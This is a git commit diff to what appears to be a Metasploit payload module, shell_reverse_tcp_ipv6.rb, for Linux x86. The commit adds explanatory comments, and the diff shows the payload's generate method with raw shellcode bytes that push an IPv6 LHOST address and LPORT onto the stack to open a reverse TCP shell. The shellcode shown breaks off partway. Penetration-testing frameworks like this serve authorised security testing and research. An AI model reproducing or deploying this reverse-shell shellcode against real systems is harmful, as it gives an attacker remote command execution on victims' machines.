93c03475c88903ba0ef35da62e8590dae9fbeb38
Matteo Malvica <matteo@malvica.com>
2018-05-30 09:04:23 +0200

    Update shell_reverse_tcp_ipv6.rb

--- modules/payloads/singles/linux/x86/shell_reverse_tcp_ipv6.rb
+++ modules/payloads/singles/linux/x86/shell_reverse_tcp_ipv6.rb
@@ -29,7 +29,7 @@ module MetasploitModule
   end
 
   def generate
-      target_ipv6 = IPAddr.new(datastore['LHOST']).hton.scan(/..../)
+      target_ipv6 = IPAddr.new(datastore['LHOST']).hton.scan(/..../) # convert LHOST to expanded IPv6 address in hex format
       first_dword  = target_ipv6[0]
       second_dword = target_ipv6[1]
       third_dword  = target_ipv6[2]
@@ -37,11 +37,11 @@ module MetasploitModule
       "\x31\xdb\xf7\xe3\x6a\x06\x6a\x01\x6a\x0a\x89\xe1\xb0\x66\xb3\x01" +
       "\xcd\x80\x89\xc6\x31\xc0\xb0\x02\x31\xdb\xcd\x80\x39\xd8\x74\x02" +
       "\x77\x70\x31\xc9\x31\xdb\x53\x53" +
-      "\x68" + fourth_dword +
+      "\x68" + fourth_dword + # push the four dward on the stack in reverse order
       "\x68" + third_dword  +
       "\x68" + second_dword +
       "\x68" + first_dword  +
-      "\x53\x66\x68" + [datastore['LPORT'].to_i].pack('S>') +
+      "\x53\x66\x68" + [datastore['LPORT'].to_i].pack('S>') + # push the TCP port on the stack 
       "\x66\x6a\x0a\x89\xe1\x6a\x1c\x51\x56\x31\xdb\x31\xc0\xb0\x66\xb3" +
       "\x03\x89\xe1\xcd\x80\x31\xdb\x39\xd8\x75\x36\x31\xc9\xf7\xe1\x89" +
       "\xf3\xb0\x3f\xcd\x80\x31\xc0\x41\x89\xf3\xb0\x3f\xcd\x80\x31\xc0" +
